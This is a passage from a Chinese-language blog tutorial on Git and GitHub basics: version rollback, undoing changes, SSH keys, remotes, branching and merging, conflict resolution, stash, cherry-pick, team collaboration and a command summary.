class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br></pre></td></tr></table></figure><h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><p><code>查看历史记录</code></p><blockquote><p>显示从最近到最远的提交日。</p><font size="2">需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</font></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><p><code>版本回退</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br></pre></td></tr></table></figure><blockquote><p>上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，当你回退版本的时候，Git仅仅是把HEAD从指向<code>回退前的状态</code>改为指向<code>回退后的状态</code>，然后顺便把工作区的文件更新了。</p></blockquote><p><code>查看每一次命令的信息</code></p><blockquote><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h4 id="6-撤销修改"><a href="#6-撤销修改" class="headerlink" title="6.撤销修改"></a>6.撤销修改</h4><p><code>丢弃工作区的修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>命令<code>git checkout -- readme.txt</code>意思就是，把<code>readme.txt</code>文件在工作区的修改全部撤销，这里有两种情况：</p><ul><li><p>一种是<code>readme.txt</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p></li><li><p>一种是<code>readme.txt</code>已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p></li></ul><p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p><font size="2">`git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令</font></blockquote><h4 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7.删除文件"></a>7.删除文件</h4><blockquote><p>在Git中，删除也是一个修改操作，</p></blockquote><p><code>确实要从版本库中删除该文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line">rm 'test.txt'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove test.txt"</span></span></span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure><h3 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h3><h4 id="1-创建SSH-Key"><a href="#1-创建SSH-Key" class="headerlink" title="1.创建SSH Key"></a>1.创建SSH Key</h4><blockquote><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p></blockquote><h4 id="2-登陆GitHub"><a href="#2-登陆GitHub" class="headerlink" title="2.登陆GitHub"></a>2.登陆GitHub</h4><blockquote><p>打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容：</p></blockquote><p><img src="/images/143-2.png" alt></p><h4 id="3-添加远程库"><a href="#3-添加远程库" class="headerlink" title="3.添加远程库"></a>3.添加远程库</h4><p><code>情景</code></p><blockquote><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p></blockquote><p><code>第一步</code></p><blockquote><p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p></blockquote><p><code>第二步</code></p><blockquote><p>在Repository name填入<code>learngit</code>，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p></blockquote><p><code>第三步</code></p><blockquote><p>将本地git仓库和远程的github仓库关联起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">" Your Github address"</span></span></span><br></pre></td></tr></table></figure><p><code>第四步</code></p><blockquote><p>把本地仓库的所有内容推送到远程库上</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><blockquote><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们<strong>第一次推送<code>master</code>分支时，加上了<code>-u</code>参数</strong>，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p></blockquote><h4 id="4-从远程仓库克隆"><a href="#4-从远程仓库克隆" class="headerlink" title="4.从远程仓库克隆"></a>4.从远程仓库克隆</h4><p><code>克隆一个本地库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@<span class="string">"github address"</span></span></span><br></pre></td></tr></table></figure><h4 id="5-创建与合并分支"><a href="#5-创建与合并分支" class="headerlink" title="5.创建与合并分支"></a>5.创建与合并分支</h4><blockquote><p><code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="/images/143-3.png" alt></p><blockquote><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p></blockquote><p><img src="/images/143-4.png" alt></p><blockquote><p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p></blockquote><p><img src="/images/143-5.png" alt></p><blockquote><p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并呢？最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p></blockquote><p><img src="/images/143-6.png" alt></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p></blockquote><p><img src="/images/143-7.png" alt></p><p><code>创建dev分支，然后切换dev分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b dev</span></span><br></pre></td></tr></table></figure><blockquote><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev</span></span><br></pre></td></tr></table></figure><p><code>查看当前分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><code>把dev分支的工作成果合并到master分支上</code></p><blockquote><p>要先执行<code>git add &quot;fileName&quot;</code>和<code>git commit &quot;fileName&quot;</code>，才能进行合并</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。如果<font color="red">合并分支时加上<code>--no-ff</code>参数：表示禁用<code>Fast forward</code></font>的区别：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br></pre></td></tr></table></figure><blockquote><p>下图是加上该参数的情况</p></blockquote><p><img src="/images/143-8.png" alt></p><p><code>查看分支合并的情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br></pre></td></tr></table></figure><h4 id="6-删除分支"><a href="#6-删除分支" class="headerlink" title="6.删除分支"></a>6.删除分支</h4><p><code>删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><p><code>强行删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br></pre></td></tr></table></figure><h4 id="7-解决冲突"><a href="#7-解决冲突" class="headerlink" title="7.解决冲突"></a>7.解决冲突</h4><blockquote><p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; feature1</span></span><br></pre></td></tr></table></figure><blockquote><p>我们修改如下后保存：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure><h4 id="8-分支策略"><a href="#8-分支策略" class="headerlink" title="8.分支策略"></a>8.分支策略</h4><blockquote><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。所以，团队合作的分支看起来就像这样：</p></blockquote><p><img src="/images/143-9.png" alt></p><h4 id="9-Bug分支"><a href="#9-Bug分支" class="headerlink" title="9.Bug分支"></a>9.Bug分支</h4><p><code>储存当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br></pre></td></tr></table></figure><p><code>从当前分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br></pre></td></tr></table></figure><p><code>创建Bug分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br></pre></td></tr></table></figure><p><code>修复Bug</code></p><p><code>从bug分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br></pre></td></tr></table></figure><p><code>合并分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br></pre></td></tr></table></figure><p><code>切换到干活的分支</code></p><p><code>查看当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br></pre></td></tr></table></figure><p><code>恢复当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复的同时把stash内容也删了</p></blockquote><p><code>在不同的分支上同步修改bug的操作</code></p><blockquote><p>比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br></pre></td></tr></table></figure><h4 id="10-多人协作"><a href="#10-多人协作" class="headerlink" title="10.多人协作"></a>10.多人协作</h4><p><code>查看远程库信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure><blockquote><p>用<code>git remote -v</code>显示更详细的信息</p></blockquote><p><code>推送分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br></pre></td></tr></table></figure><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li><code>bug</code>分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li><code>featur</code>e分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><p><code>抓取分支</code></p><blockquote><p>首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat env.txt</span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add env.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"add new env"</span></span></span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: 'git pull ...') before pushing again.</span><br><span class="line">hint: See the 'Note about fast-forwards' in 'git push --help' for details.</span><br></pre></td></tr></table></figure><blockquote><p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure><blockquote><p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --<span class="built_in">set</span>-upstream-to=origin/dev dev</span></span><br><span class="line">Branch 'dev' set up to track remote branch 'dev' from 'origin'.</span><br></pre></td></tr></table></figure><blockquote><p>再pull：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><blockquote><p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的<a href="#### 7.解决冲突">解决冲突</a>完全一样。解决后，提交，再push：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"fix env conflict"</span></span></span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure><p>因此，多人协作的工作模式通常是这样：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li></ol><p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p><h3 id="三、命令总结"><a href="#三、命令总结" class="headerlink" title="三、命令总结"></a>三、命令总结</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">`配置用户名`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br><span class="line"></span><br><span class="line">`初始化`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line"></span><br><span class="line">`将文件添加到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br><span class="line"></span><br><span class="line">`将文件提交到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br><span class="line"></span><br><span class="line">`查看当前仓库的状态`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">`查看修改的内容`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br><span class="line"></span><br><span class="line">`查看历史记录`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">`版本回退`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br><span class="line"></span><br><span class="line">`查看每一次命令的信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line"></span><br><span class="line">`丢弃工作区的修改`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br><span class="line"></span><br><span class="line">`删除文件`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line"></span><br><span class="line">`将本地仓库和远程仓库关联起来`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">"Your Github repository name"</span></span></span><br><span class="line"></span><br><span class="line">`查看远程库信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line"></span><br><span class="line">`查看远程库详细信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">`将本地仓库的内容推送到远程库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br><span class="line"></span><br><span class="line">`创建分支`+-----------------+</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch dev++</span></span><br><span class="line">+========== $ git checkout -b dev</span><br><span class="line">`切换分支`   ++</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev or $ git switch dev +-----------------+</span></span><br><span class="line"></span><br><span class="line">`查看当前分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch </span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（启用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（禁用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br><span class="line"></span><br><span class="line">`查看分支合并的情况`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br><span class="line"></span><br><span class="line">`删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br><span class="line"></span><br><span class="line">`强行删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br><span class="line"></span><br><span class="line">`储存当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line"></span><br><span class="line">`从当前分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br><span class="line"></span><br><span class="line">`创建Bug分支`</span><br><span class="line"><span class="meta">$</span><span 